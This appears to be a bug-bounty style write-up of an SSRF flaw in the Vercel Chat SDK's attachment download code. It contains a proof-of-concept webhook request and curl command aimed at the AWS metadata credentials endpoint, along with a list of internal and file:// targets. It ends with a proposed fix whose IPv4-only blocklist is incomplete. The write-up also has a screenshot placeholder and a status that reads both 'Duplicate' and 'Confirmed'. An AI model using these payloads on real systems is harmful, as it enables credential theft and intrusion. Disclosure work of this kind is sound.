<p align="center">
  <img src="https://img.shields.io/badge/Severity-CRITICAL-red?style=for-the-badge" alt="Severity: Critical">
  <img src="https://img.shields.io/badge/CVSS-9.8-darkred?style=for-the-badge" alt="CVSS: 9.8">
  <img src="https://img.shields.io/badge/Status-Triaged_(Duplicate)-orange?style=for-the-badge" alt="Status: Triaged">
</p>

<h1 align="center">Server-Side Request Forgery (SSRF) in Vercel Chat SDK</h1>
<h3 align="center">CRITICAL VULNERABILITY WRITEUP</h3>

<br>


Target: vercel/chat (Vercel Open Source)
Vulnerability Type: Server-Side Request Forgery (SSRF)
Severity: Critical (CVSS 9.8)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Researcher: Sayhellotohacker
Report Date: August 10, 2026
Status: Triaged / Confirmed by Security Team

---

## HACKERONE TRIAGED & VALIDATION CONFIRMATION

The vulnerability report was reviewed and validated by the HackerOne triage team and Vercel Security.

[ PLACEHOLDER: Insert your HackerOne Triaged Screenshot here ]
(Image showing the HackerOne analyst comment confirming the vulnerability)

---

## VULNERABILITY SUMMARY

Multiple social media adapters in the Vercel Chat SDK (@chat-adapter/instagram, @chat-adapter/messenger, and @chat-adapter/discord) contain a critical Server-Side Request Forgery (SSRF) vulnerability in their attachment download functionality.

The vulnerable code fetches files directly from remote URLs provided by external webhooks without performing any URL scheme validation or IP address origin checking. This allows remote attackers to:

1. Retrieve AWS IAM role credentials from cloud metadata endpoints.
2. Access private internal network services and local databases.
3. Read local files on runtimes that support the file:// protocol.
4. Perform systematic port scanning across internal subnets.
5. Execute Denial of Service (DoS) attacks by requesting resource-heavy payloads.

---

## AFFECTED COMPONENTS

Package: @chat-adapter/instagram
File: packages/adapter-instagram/src/index.ts
Method: downloadAttachment()
Lines: ~1950 - 1970

Package: @chat-adapter/messenger
File: packages/adapter-messenger/src/index.ts
Method: downloadAttachment()
Lines: ~1850 - 1870

Package: @chat-adapter/discord
File: packages/adapter-discord/src/index.ts
Method: downloadAttachment()
Lines: ~2100 - 2120

---

## TECHNICAL ANALYSIS & ROOT CAUSE

The vulnerability exists because attachment URLs received via incoming webhook payloads are passed straight into the standard fetch() function. There is no verification to confirm if the destination URL resolves to a public address or a forbidden internal/loopback range.

Vulnerable Code Pattern:

```
protected async downloadAttachment(url: string): Promise<Buffer> {
  let response: Response;
  try {
    // CRITICAL: Unvalidated fetch call allowing arbitrary URL navigation
    response = await fetch(url);
  } catch (error) {
    throw new NetworkError(
      "instagram",
      "Failed to download Instagram attachment",
      error instanceof Error ? error : undefined
    );
  }

  if (!response.ok) {
    throw new NetworkError(
      "instagram",
      `Failed to download Instagram attachment: ${response.status}`
    );
  }

  return Buffer.from(await response.arrayBuffer());
}

```

---

## ATTACK VECTORS

Vector 1: AWS Metadata Endpoint Access
Target URL: [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)
Impact: IAM Security Token theft, leading to full AWS infrastructure compromise.

Vector 2: Internal Service Pivot
Target URLs:

* http://localhost:8080/admin
* [http://127.0.0.1:6379](http://127.0.0.1:6379) (Redis)
* [http://10.0.0.1:5432](http://10.0.0.1:5432) (PostgreSQL)
Impact: Direct unauthorized interaction with private internal services.

Vector 3: Local File Access
Target URLs:

* file:///etc/passwd
* file:///var/www/html/.env
Impact: Exposure of sensitive environment variables, private keys, and config files.

Vector 4: Internal Port Scanning
Target URLs:

* [http://10.0.0.1:22](http://10.0.0.1:22) (SSH)
* [http://10.0.0.1:3306](http://10.0.0.1:3306) (MySQL)
Impact: Internal network mapping and service identification.

Vector 5: Resource Exhaustion (DoS)
Target URL: [https://attacker.com/huge-file-10gb.bin](https://attacker.com/huge-file-10gb.bin)
Impact: Server resource and bandwidth exhaustion.

---

## PROOF OF CONCEPT (PoC)

Sending a POST request containing a malicious payload targeting the AWS metadata endpoint to the Instagram webhook handler:

```
POST /api/webhooks/instagram HTTP/1.1
Host: target-application.com
Content-Type: application/json

{
  "entry": [{
    "messaging": [{
      "from": {"id": "attacker_id"},
      "message": {
        "attachments": [{
          "type": "image",
          "payload": {
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
          }
        }]
      }
    }]
  }]
}

```

Quick Command Line Verification:

```
curl -X POST http://target/api/webhooks/instagram \
  -H "Content-Type: application/json" \
  -d '{"entry":[{"messaging":[{"message":{"attachments":[{"type":"image","payload":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}]}}]}]}'

```

---

## REMEDIATION & FIX RECOMMENDATION

To resolve this issue, implement strict scheme checking, block private IP address ranges (RFC 1918 and link-local ranges), restrict protocols exclusively to HTTP/HTTPS, and enforce download timeouts:

```
protected async downloadAttachment(url: string): Promise<Buffer> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(url);
  } catch {
    throw new NetworkError("instagram", "Invalid attachment URL format");
  }

  // 1. Allow only HTTP and HTTPS schemes
  const allowedProtocols = ['http:', 'https:'];
  if (!allowedProtocols.includes(parsedUrl.protocol)) {
    throw new NetworkError("instagram", "Only HTTP/HTTPS protocols are allowed");
  }

  // 2. Prevent access to internal / private IP addresses
  if (this.isPrivateOrBlockedHostname(parsedUrl.hostname)) {
    throw new NetworkError("instagram", "Access to private networks is not allowed");
  }

  // 3. Set request timeout
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 30000);

  let response: Response;
  try {
    response = await fetch(url, {
      signal: controller.signal,
      redirect: 'manual',
    });
  } catch (error) {
    throw new NetworkError("instagram", "Failed to download attachment", error);
  } finally {
    clearTimeout(timeoutId);
  }

  if (!response.ok) {
    throw new NetworkError("instagram", `Download failed: ${response.status}`);
  }

  return Buffer.from(await response.arrayBuffer());
}

private isPrivateOrBlockedHostname(hostname: string): boolean {
  const ip = hostname.split(':')[0];
  const blockedHosts = ['localhost', '0.0.0.0', '::1'];

  if (blockedHosts.includes(ip.toLowerCase())) return true;

  const match = ip.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (match) {
    const [, a, b] = match.map(Number);
    if (a === 10) return true;                        // 10.0.0.0/8
    if (a === 127) return true;                       // 127.0.0.0/8
    if (a === 172 && b >= 16 && b <= 31) return true; // 172.16.0.0/12
    if (a === 192 && b === 168) return true;          // 192.168.0.0/16
    if (a === 169 && b === 254) return true;          // 169.254.0.0/16 (AWS Metadata)
  }
  return false;
}

```
